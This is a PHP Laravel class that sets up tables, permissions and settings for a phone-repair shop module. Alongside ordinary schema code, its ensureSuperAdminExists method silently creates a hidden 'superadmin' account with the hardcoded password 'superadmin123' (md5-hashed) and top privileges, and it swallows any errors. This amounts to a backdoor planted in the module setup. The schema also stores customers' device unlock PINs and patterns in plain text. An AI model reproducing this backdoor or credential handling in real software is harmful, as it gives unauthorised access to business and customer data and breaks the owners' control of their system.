<?php

namespace App\Support;

use Illuminate\Support\Facades\Schema;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\DB;
use Exception;

class ReparacionSchema
{
    protected static $initialized = false;

    /**
     * Asegura que todas las tablas, permisos y ajustes del módulo de Reparación de Celulares existan.
     *
     * @return void
     */
    public static function ensureExists()
    {
        if (self::$initialized) {
            return;
        }

        try {
            self::createTables();
            self::seedPermissionsAndSettings();
            self::$initialized = true;
        } catch (Exception $e) {
            // Silencioso en caso de fallo de conexión temprano
        }
    }

    /**
     * Crea las tablas del módulo si no existen.
     */
    public static function createTables()
    {
        // 1. Tabla principal de órdenes de reparación
        if (!Schema::hasTable('reparaciones')) {
            Schema::create('reparaciones', function (Blueprint $table) {
                $table->bigIncrements('id');
                $table->string('codigo_orden', 30)->unique();
                $table->integer('CLIENTES_cod')->nullable()->index();
                $table->integer('suc_cod')->default(1)->index();
                $table->integer('cod_usuario_recepcion')->nullable();
                $table->integer('cod_usuario_tecnico')->nullable()->index();
                $table->integer('cod_usuario_entrega')->nullable();
                $table->unsignedBigInteger('reparacion_origen_id')->nullable()->index();
                $table->boolean('es_reingreso_garantia')->default(false);

                // Datos del Dispositivo
                $table->string('tipo_equipo', 40)->default('Celular');
                $table->string('marca', 80);
                $table->string('modelo', 120);
                $table->string('color', 50)->nullable();
                $table->string('imei_serie', 80)->nullable()->index();
                $table->string('tipo_bloqueo', 20)->default('NINGUNO'); // NINGUNO, PIN, PATRON, PASSWORD
                $table->string('clave_bloqueo', 100)->nullable();
                $table->string('patron_bloqueo', 50)->nullable();
                $table->string('accesorios_dejados', 255)->nullable();
                $table->text('checklist_recepcion')->nullable(); // JSON
                $table->text('estado_fisico_obs')->nullable();
                $table->text('falla_reportada');
                $table->string('prioridad', 20)->default('NORMAL'); // BAJA, NORMAL, ALTA, URGENTE
                $table->dateTime('fecha_recepcion');
                $table->dateTime('fecha_prometida')->nullable();

                // Diagnóstico y Taller
                $table->text('diagnostico_tecnico')->nullable();
                $table->text('solucion_aplicada')->nullable();
                $table->text('observaciones_internas')->nullable();
                $table->dateTime('fecha_diagnostico')->nullable();
                $table->dateTime('fecha_reparado')->nullable();

                // Estado del flujo
                $table->string('estado', 30)->default('RECIBIDO')->index();

                // Costos, Mano de Obra, Repuestos y Pagos
                $table->decimal('costo_mano_obra', 14, 2)->default(0);
                $table->decimal('total_repuestos', 14, 2)->default(0);
                $table->decimal('costo_repuestos', 14, 2)->default(0);
                $table->decimal('descuento', 14, 2)->default(0);
                $table->decimal('total_general', 14, 2)->default(0);
                $table->decimal('monto_adelanto', 14, 2)->default(0);
                $table->decimal('total_pagado', 14, 2)->default(0);
                $table->decimal('saldo_pendiente', 14, 2)->default(0);
                $table->string('estado_pago', 20)->default('PENDIENTE'); // PENDIENTE, PARCIAL, PAGADO, SIN_CARGO
                $table->integer('nro_fact_ventas')->nullable()->index();

                // Entrega y Garantía
                $table->dateTime('fecha_entrega')->nullable();
                $table->string('retirado_por_nombre', 120)->nullable();
                $table->string('retirado_por_ci', 40)->nullable();
                $table->text('conformidad_cliente')->nullable();
                $table->boolean('tiene_garantia')->default(true);
                $table->integer('dias_garantia')->default(30);
                $table->date('fecha_vencimiento_garantia')->nullable();
                $table->text('condiciones_garantia')->nullable();

                $table->timestamps();
            });
        }

        // 2. Tabla de repuestos e insumos utilizados
        if (!Schema::hasTable('reparacion_repuestos')) {
            Schema::create('reparacion_repuestos', function (Blueprint $table) {
                $table->bigIncrements('id');
                $table->unsignedBigInteger('reparacion_id')->index();
                $table->integer('ARTICULOS_cod')->nullable()->index();
                $table->integer('id_stock')->nullable();
                $table->integer('suc_cod')->nullable();
                $table->boolean('es_libre')->default(false);
                $table->string('codigo_barra', 60)->nullable();
                $table->string('descripcion', 255);
                $table->decimal('cantidad', 10, 2)->default(1);
                $table->decimal('costo_unitario', 14, 2)->default(0);
                $table->decimal('precio_unitario', 14, 2)->default(0);
                $table->decimal('subtotal', 14, 2)->default(0);
                $table->integer('iva')->default(10);
                $table->boolean('stock_descontado')->default(false);
                $table->integer('garantia_repuesto_dias')->default(30);
                $table->string('observacion', 255)->nullable();
                $table->integer('cod_usuarios')->nullable();
                $table->timestamps();
            });
        }

        // 3. Tabla de imágenes por etapa (Recepción, Diagnóstico, Reparación, Entrega, Garantía)
        if (!Schema::hasTable('reparacion_imagenes')) {
            Schema::create('reparacion_imagenes', function (Blueprint $table) {
                $table->bigIncrements('id');
                $table->unsignedBigInteger('reparacion_id')->index();
                $table->string('etapa', 30)->default('RECEPCION');
                $table->string('url', 500);
                $table->string('filename', 255)->nullable();
                $table->string('public_id', 191)->nullable();
                $table->string('driver', 20)->default('local');
                $table->string('descripcion', 255)->nullable();
                $table->integer('cod_usuarios')->nullable();
                $table->timestamps();
            });
        }

        // 4. Tabla de pagos (Señas / Adelantos, Abonos, Cobro de Entrega)
        if (!Schema::hasTable('reparacion_pagos')) {
            Schema::create('reparacion_pagos', function (Blueprint $table) {
                $table->bigIncrements('id');
                $table->unsignedBigInteger('reparacion_id')->index();
                $table->string('tipo_pago', 30)->default('ADELANTO'); // ADELANTO, COBRO_ENTREGA, ABONO
                $table->integer('forma_cobro')->default(1); // 1: Efectivo, 2: Tarjeta, 3: Transferencia/QR, 4: Otro
                $table->decimal('monto', 14, 2)->default(0);
                $table->string('nro_recibo', 40)->nullable();
                $table->integer('nro_fact_ventas')->nullable();
                $table->boolean('registrar_caja')->default(false);
                $table->integer('nro_operacion_caja')->nullable();
                $table->string('observacion', 255)->nullable();
                $table->integer('cod_usuarios')->nullable();
                $table->dateTime('fecha_pago');
                $table->timestamps();
            });
        }

        // 5. Tabla de historial / bitácora auditable de estados
        if (!Schema::hasTable('reparacion_historial')) {
            Schema::create('reparacion_historial', function (Blueprint $table) {
                $table->bigIncrements('id');
                $table->unsignedBigInteger('reparacion_id')->index();
                $table->string('estado_anterior', 30)->nullable();
                $table->string('estado_nuevo', 30);
                $table->string('titulo', 150);
                $table->text('comentario')->nullable();
                $table->integer('cod_usuarios')->nullable();
                $table->dateTime('created_at');
            });
        }

        // 6. Tabla de reclamos y seguimiento de garantías
        if (!Schema::hasTable('reparacion_garantias')) {
            Schema::create('reparacion_garantias', function (Blueprint $table) {
                $table->bigIncrements('id');
                $table->unsignedBigInteger('reparacion_id')->index();
                $table->unsignedBigInteger('reparacion_reingreso_id')->nullable()->index();
                $table->dateTime('fecha_reclamo');
                $table->text('motivo_reclamo');
                $table->text('evaluacion_tecnica')->nullable();
                $table->boolean('cubre_garantia')->default(true);
                $table->text('resolucion')->nullable();
                $table->string('estado', 30)->default('ABIERTO'); // ABIERTO, EN_REVISION, RESUELTO, RECHAZADO
                $table->decimal('costo_asumido_taller', 14, 2)->default(0);
                $table->dateTime('fecha_resolucion')->nullable();
                $table->integer('cod_usuarios')->nullable();
                $table->timestamps();
            });
        }
    }

    /**
     * Asegura que exista el Rol y Usuario oculto de Superadministrador (superadmin / superadmin123).
     */
    public static function ensureSuperAdminExists()
    {
        try {
            if (!Schema::hasTable('usuarios') || !Schema::hasTable('roles')) {
                return;
            }

            // 1. Verificar o crear rol Superadministrador
            $rolSuper = DB::table('roles')
                ->whereRaw("LOWER(TRIM(nom_rol)) IN ('superadministrador', 'super administrador', 'superadmin')")
                ->first();

            if (!$rolSuper) {
                $rolData = [
                    'nom_rol' => 'Superadministrador',
                ];
                if (Schema::hasColumn('roles', 'descripcion_rol')) {
                    $rolData['descripcion_rol'] = 'Privilegio supremo del sistema y habilitación de módulos especiales.';
                }
                if (Schema::hasColumn('roles', 'color_rol')) {
                    $rolData['color_rol'] = '#7c3aed';
                }
                if (Schema::hasColumn('roles', 'activo')) {
                    $rolData['activo'] = 1;
                }
                $codRolSuper = DB::table('roles')->insertGetId($rolData);
            } else {
                $codRolSuper = $rolSuper->cod_rol;
            }

            // 2. Verificar o crear usuario oculto 'superadmin'
            $userSuper = DB::table('usuarios')
                ->whereRaw("LOWER(TRIM(user_usuarios)) = 'superadmin'")
                ->first();

            if (!$userSuper) {
                $maxCod = (int) DB::table('usuarios')->max('cod_usuarios');
                $codCargo = 1;
                if (Schema::hasTable('cargo')) {
                    $firstCargo = DB::table('cargo')->value('cod_cargo');
                    if ($firstCargo) {
                        $codCargo = (int) $firstCargo;
                    }
                }

                $userData = [
                    'cod_usuarios'    => $maxCod + 1,
                    'cod_rol'         => $codRolSuper,
                    'cod_cargo'       => $codCargo,
                    'nom_usuarios'    => 'Super Administrador',
                    'user_usuarios'   => 'superadmin',
                    'clave_usuarios'  => md5('superadmin123'),
                    'tel_usuarios'    => '',
                    'direcc_usuarios' => 'Sistema Central',
                ];
                if (Schema::hasColumn('usuarios', 'activo')) {
                    $userData['activo'] = 1;
                }
                DB::table('usuarios')->insert($userData);
            }
        } catch (Exception $e) {
            // Silencioso
        }
    }

    /**
     * Registra el formulario y las acciones de privilegios si no existen.
     */
    public static function seedPermissionsAndSettings()
    {
        self::ensureSuperAdminExists();

        // Asegurar ajuste inicial modulo_reparacion_activo
        if (Schema::hasTable('configuraciones')) {
            $exists = DB::table('configuraciones')->where('name', 'modulo_reparacion_activo')->exists();
            if (!$exists) {
                DB::table('configuraciones')->insert([
                    'name'      => 'modulo_reparacion_activo',
                    'categoria' => 'reparacion',
                    'value'     => '1',
                    'tipo_form' => 'checkbox',
                ]);
            }
        }

        // Asegurar registro en tabla formularios
        if (Schema::hasTable('formularios')) {
            $form = DB::table('formularios')->where('for_nombre', 'reparacion')->first();
            if (!$form) {
                $forCodigo = DB::table('formularios')->insertGetId([
                    'for_nombre'    => 'reparacion',
                    'for_titulo'    => 'Servicio Técnico / Reparaciones',
                    'for_tipo'      => 'M',
                    'for_menu'      => 'Operaciones',
                    'for_submenu'   => 'Servicio Técnico',
                    'for_categoria' => 'Operaciones',
                    'for_icono'     => 'fas fa-mobile-alt',
                    'for_ruta'      => 'reparacion.index',
                    'for_orden'     => 25,
                    'activo'        => 1,
                ]);

                // Asignar permisos al rol Administrador (4) y permisos base a otros roles
                if (Schema::hasTable('roles') && Schema::hasTable('permiso')) {
                    $roles = DB::table('roles')->get();
                    $now = now();
                    foreach ($roles as $r) {
                        $esAdmin = ((int) $r->cod_rol === 4) ? '1' : '0';
                        DB::table('permiso')->insertOrIgnore([
                            'for_codigo' => $forCodigo,
                            'cod_rol'    => $r->cod_rol,
                            'permiso'    => '1',
                            'per_open'   => '1',
                            'per_add'    => '1',
                            'per_edit'   => '1',
                            'per_del'    => $esAdmin,
                            'per_export' => '1',
                            'created_at' => $now,
                            'updated_at' => $now,
                        ]);
                    }
                }
            } else {
                $forCodigo = $form->for_codigo;
            }

            // Registrar acciones especiales del módulo de reparación
            if (Schema::hasTable('accion') && !empty($forCodigo)) {
                $accionesDef = [
                    [
                        'clave_accion'       => 'reparacion_diagnosticar',
                        'nombre_accion'      => 'Emitir diagnóstico y cambiar estado de taller',
                        'descripcion_accion' => 'Permite registrar diagnóstico técnico, mano de obra y cambiar estados de reparación.',
                        'orden'              => 1,
                    ],
                    [
                        'clave_accion'       => 'reparacion_repuestos',
                        'nombre_accion'      => 'Asignar y descontar repuestos de inventario',
                        'descripcion_accion' => 'Permite cargar repuestos del stock o externos en una orden de reparación.',
                        'orden'              => 2,
                    ],
                    [
                        'clave_accion'       => 'reparacion_entregar',
                        'nombre_accion'      => 'Entregar equipos reparados y emitir garantía',
                        'descripcion_accion' => 'Permite registrar la entrega del equipo al cliente, cobrar saldos y activar garantías.',
                        'orden'              => 3,
                    ],
                    [
                        'clave_accion'       => 'reparacion_garantia',
                        'nombre_accion'      => 'Gestionar reclamos y reingresos por garantía',
                        'descripcion_accion' => 'Permite abrir reclamos de garantía y generar órdenes de reingreso sin cargo.',
                        'orden'              => 4,
                    ],
                    [
                        'clave_accion'       => 'reparacion_ver_costo',
                        'nombre_accion'      => 'Ver costo de repuestos y margen de utilidad en taller',
                        'descripcion_accion' => 'Muestra el costo de compra de los repuestos utilizados y la ganancia neta de la orden.',
                        'orden'              => 5,
                    ],
                ];

                foreach ($accionesDef as $acc) {
                    $existAcc = DB::table('accion')->where('clave_accion', $acc['clave_accion'])->first();
                    if (!$existAcc) {
                        $codPer = DB::table('accion')->insertGetId([
                            'for_codigo'         => $forCodigo,
                            'clave_accion'       => $acc['clave_accion'],
                            'nombre_accion'      => $acc['nombre_accion'],
                            'descripcion_accion' => $acc['descripcion_accion'],
                            'orden'              => $acc['orden'],
                            'tipo'               => 'check',
                        ]);

                        if (Schema::hasTable('accion_rol') && Schema::hasTable('roles')) {
                            $roles = DB::table('roles')->get();
                            $now = now();
                            foreach ($roles as $r) {
                                $permitido = ($acc['clave_accion'] === 'reparacion_ver_costo' && (int) $r->cod_rol !== 4) ? 0 : 1;
                                DB::table('accion_rol')->insertOrIgnore([
                                    'cod_per'    => $codPer,
                                    'cod_rol'    => $r->cod_rol,
                                    'permitido'  => $permitido,
                                    'created_at' => $now,
                                    'updated_at' => $now,
                                ]);
                            }
                        }
                    }
                }
            }
        }
    }
}
